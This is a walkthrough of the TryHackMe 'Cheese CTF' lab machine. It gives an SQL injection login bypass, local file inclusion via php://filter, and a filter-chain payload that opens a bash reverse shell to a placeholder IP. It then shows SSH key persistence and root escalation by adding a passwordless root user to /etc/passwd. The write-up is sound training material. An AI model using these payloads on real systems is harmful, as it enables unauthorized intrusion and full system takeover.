# Cheese CTF - TryHackMe Writeup 🧀

Welcome to my writeup for the [Cheese CTF](https://tryhackme.com/room/cheesectfv10) room on [TryHackMe](https://tryhackme.com/).

This room focuses on web vulnerabilities, manual enumeration, and privilege escalation. Below, I walk through each step I took to compromise the machine and gain root access.

> ⚠️ This is for educational purposes only.

# Port Scanning
We began with a full Nmap scan, which returned over 100 open ports — most of them false positives or irrelevant.

The only ports of real interest were:
```python
Port 80 (HTTP)
Port 22 (SSH)
```
# Enumeration
```python
gobuster dir -u http://10.10.26.246 -w /usr/share/wordlists/dirb/common.txt -t 50 -x php,html
```
Interesting results:
```python
/images               (Status: 301)
/index.html           (Status: 200)
/login.php            (Status: 200)
/messages.html        (Status: 200)
/orders.html          (Status: 200)
/users.html           (Status: 200)
```
The most interesting files were /login.php and /messages.html.

# Initial Access - SQL Injection
Using a basic SQLi payload on /login.php:
```python
admin' || '1'='1'; -- -
```
We bypassed authentication and were redirected to a new page:
```python
http://10.10.26.246/secret-script.php?file=php://filter/resource=supersecretmessageforadmin
```
Testing with:
```python
http://10.10.26.246/secret-script.php?file=php://filter/resource=/etc/passwd
```
✅ Confirmed LFI (Local File Inclusion) vulnerability.

# LFI to Shell
To exploit LFI and get a reverse shell, we used this tool:
```python
https://github.com/synacktiv/php_filter_chain_generator
```
Generated payload:
```python
python3 php_filter_chain_generator.py --chain "<?php exec(\"/bin/bash -c 'bash -i >& /dev/tcp/YOUR_IP/YOUR_PORT 0>&1'\"); ?>" | grep "^php" > payload.txt
```
Started listener:
```python
nc -lvnp 4444
```
Then we injected the payload by browsing to:
```python
http://10.10.26.246/secret-script.php?file=<base64_payload_here>
```
✅ We received a reverse shell.

# SSH Access
In the shell, we checked ~/.ssh/ and found an authorized_keys file.
Steps:
1. Generated SSH key locally:
```python
ssh-keygen -t rsa
```
2. Appended our public key to the target's authorized_keys:
```python
echo "<id_rsa.pub>" >> authorized_keys
```
3. Logged in with our private key:
```python
ssh -i id_rsa comte@<ip>
```
Read the user flag:
```python
cat /home/comte/user.txt
```
# Privilege Escalation
Checking sudo permissions:
```python
sudo -l
```
We could run the following without password:
```python
/bin/systemctl daemon-reload
/bin/systemctl restart exploit.timer
/bin/systemctl start exploit.timer
/bin/systemctl enable exploit.timer
```
Looking into /etc/systemd/system/exploit.timer revealed a missing [Timer] option
```python
OnBootSec=5
```
The service file (exploit.service) showed it executed /opt/xxd.
Used [GTFOBins](https://gtfobins.github.io/gtfobins/xxd/) to write to /etc/passwd:
```python
echo "KRY::0:0:KRY:/root:/bin/bash" | xxd | /opt/xxd -r - "/etc/passwd"
```
Switched to root:
```python
su KRY
```
Read root flag:
```python
cat /root/root.txt
```
## Conclusion

Thanks for reading my write-up for the Cheese CTF room on TryHackMe.  
This was a fun and educational challenge that helped reinforce concepts like LFI, SQLi, and privilege escalation.

